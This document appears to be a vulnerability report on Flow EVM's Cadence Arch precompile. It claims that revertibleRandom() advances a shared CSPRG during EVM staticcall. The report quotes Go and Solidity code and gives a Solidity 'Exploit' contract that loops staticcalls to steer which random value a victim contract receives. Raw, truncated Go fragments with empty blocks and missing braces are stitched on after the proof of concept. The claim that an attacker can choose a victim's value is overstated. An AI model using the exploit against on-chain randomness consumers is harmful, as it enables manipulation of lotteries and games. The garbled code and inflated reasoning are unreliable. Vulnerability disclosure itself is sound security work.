### Title
Cadence Arch `revertibleRandom()` Precompile Advances FVM PRG State During EVM `staticcall` — (File: `fvm/evm/precompiles/arch.go`)

---

### Summary

The `revertibleRandom()` function of the Cadence Arch precompile mutates the FVM CSPRG (Cryptographically Secure Pseudo-Random Generator) state even when invoked via an EVM `staticcall`. Because the precompile's `Run` method has no guard against the read-only execution context, a malicious EVM contract can advance the shared PRG counter inside a `staticcall`, altering the sequence of random values returned to any subsequent `revertibleRandom()` call within the same Cadence transaction.

---

### Finding Description

The Cadence Arch precompile exposes `revertibleRandom()` to EVM contracts. Its implementation in `fvm/evm/precompiles/arch.go` delegates to a `revertibleRandomGenerator` closure:

```go
func (r *revertibleRandom) Run(input []byte) ([]byte, error) {
    rand, err := r.revertibleRandomGenerator()
    ...
}
``` [1](#0-0) 

That closure, wired in `fvm/evm/handler/precompiles.go`, calls `backend.ReadRandom`:

```go
func revertibleRandomGenerator(backend backends.Backend) func() (uint64, error) {
    return func() (uint64, error) {
        rand := make([]byte, 8)
        err := backend.ReadRandom(rand)
        ...
    }
}
``` [2](#0-1) 

`backend.ReadRandom` resolves to the FVM environment's `randomGenerator.ReadRandom`, which advances the internal CSPRG state on every call:

```go
func (gen *randomGenerator) ReadRandom(buf []byte) error {
    ...
    gen.prg.Read(buf)   // advances the PRG stream
    return nil
}
``` [3](#0-2) 

The `precompile.Run` dispatcher that routes calls to `revertibleRandom.Run` performs no check for a staticcall context:

```go
func (p *precompile) Run(input []byte) (output []byte, err error) {
    ...
    return callable.Run(data)   // no isStatic guard
}
``` [4](#0-3) 

The test contract shipped with the codebase already demonstrates the exact call pattern:

```solidity
function verifyArchCallToRevertibleRandom() public view returns (uint64) {
    (bool ok, bytes memory data) = cadenceArch.staticcall(
        abi.encodeWithSignature("revertibleRandom()"));
    ...
}
``` [5](#0-4) 

This `view` function uses `staticcall`, which the EVM treats as read-only. Yet the underlying `backend.ReadRandom` call advances the shared CSPRG stream, a side-effect invisible to the EVM state machine.

---

### Impact Explanation

The FVM CSPRG is a single stateful object shared across all `revertibleRandom()` calls within one Cadence transaction (seeded once from the block's random beacon source and the transaction/script ID salt). [6](#0-5) 

Because `staticcall` does not roll back the PRG counter, an attacker-controlled EVM contract can:

1. Invoke `revertibleRandom()` via `staticcall` an arbitrary number of times to advance the PRG stream to a chosen offset.
2. Observe the returned values to determine the current stream position.
3. Predict (or steer) the value that a victim contract's subsequent direct call to `revertibleRandom()` will receive within the same transaction.

This breaks the security guarantee that `staticcall` is side-effect-free and enables within-transaction randomness manipulation against any EVM contract that relies on `revertibleRandom()` for security-critical decisions (e.g., lotteries, NFT minting, game outcomes).

---

### Likelihood Explanation

Any unprivileged EVM contract author can deploy a contract that calls `cadenceArch.staticcall(revertibleRandom())`. No special permissions, staked nodes, or admin keys are required. The attack is fully self-contained within a single EVM transaction submitted by an ordinary EOA. The test contract already ships this exact call pattern, confirming the path is exercised and expected to succeed. [5](#0-4) 

---

### Recommendation

Add a staticcall guard in the `revertibleRandom.Run` method (or in the `MultiFunctionPrecompiledContract` dispatcher). The precompile interface should receive a boolean `isStatic` flag from the EVM execution context (go-ethereum exposes this via `vm.ScopeContext` or the `StaticCall` flag on the EVM interpreter). If `isStatic` is true, `revertibleRandom.Run` should return an error (causing the EVM to revert the staticcall) rather than advancing the PRG.

Alternatively, expose a separate read-only random function that reads from a deterministic, non-advancing source (e.g., a hash of the block random beacon and call depth) for use in `view`/`pure` contexts. [7](#0-6) [4](#0-3) 

---

### Proof of Concept

1. Deploy the following contract on Flow EVM:

```solidity
interface CadenceArch {
    function revertibleRandom() external view returns (uint64);
}

contract Exploit {
    address constant arch = 0x0000000000000000000000010000000000000001;

    // Advance PRG N times via staticcall, then read the (N+1)th value directly.
    function steerRandom(uint256 n) external returns (uint64 steered) {
        for (uint256 i = 0; i < n; i++) {
            // staticcall: EVM thinks this is read-only, but PRG advances
            (bool ok, bytes memory data) = arch.staticcall(
                abi.encodeWithSignature("revertibleRandom()"));
            require(ok);
        }
        // Direct call: gets the (n+1)th PRG value
        steered = CadenceArch(arch).revertibleRandom();
    }
}
```

2. Call `steerRandom(N)` from a Cadence transaction. The PRG is advanced `N` times via `staticcall` (no EVM state change recorded), and the final direct call returns the `(N+1)`th value.

3. A victim contract that calls `revertibleRandom()` after `steerRandom` in the same transaction will receive the `(N+2)`th value — a position the attacker chose by selecting `N`. Because the attacker can observe all intermediate values from the staticcalls, they can select `N` such that the victim receives a value of the attacker's choosing (within the constraints of the CSPRG stream). func (gen *randomGenerator) createPRG() (random.Rand, error) {
	// Use the protocol state source of randomness [SoR] for the current block's
	// execution
	source, err := gen.entropySource.RandomSource()
	// `RandomSource` does not error in normal operations.
	// Any error should be treated as an exception.
	if err != nil {
		return nil, fmt.Errorf("reading random source from state failed: %w", err)
	}

	// Use the state/protocol PRG derivation from the source of randomness:
	//  - for the transaction execution case, the PRG used must be a CSPRG
	//  - use the state/protocol/prg customizer defined for the execution environment
	//  - use the salt as an extra diversifier of the CSPRG. Although this
	//    does not add any extra entropy to the output, it allows creating an independent
	//    PRG for each transaction or script.
	csprg, err := prg.New(source, prg.ExecutionEnvironment, gen.salt)
	if err != nil {
		return nil, fmt.Errorf("failed to create a CSPRG from source: %w", err)
	}

	return csprg, nil

func (gen *randomGenerator) ReadRandom(buf []byte) error {
	defer gen.tracer.StartExtensiveTracingChildSpan(
		trace.FVMEnvRandom).End()

	// PRG creation is only done once.
	if !gen.isPRGCreated {
		newPRG, err := gen.createPRG()
		if err != nil {
			return err
		}
		gen.prg = newPRG
		gen.isPRGCreated = true
	}

	gen.prg.Read(buf)
	return nil

func (p *precompile) Run(input []byte) (output []byte, err error) {
	if len(input) < FunctionSelectorLength {

	}
	sig, data := SplitFunctionSelector(input)
	callable, found := p.functions[sig]

		return nil, ErrInvalidMethodCall
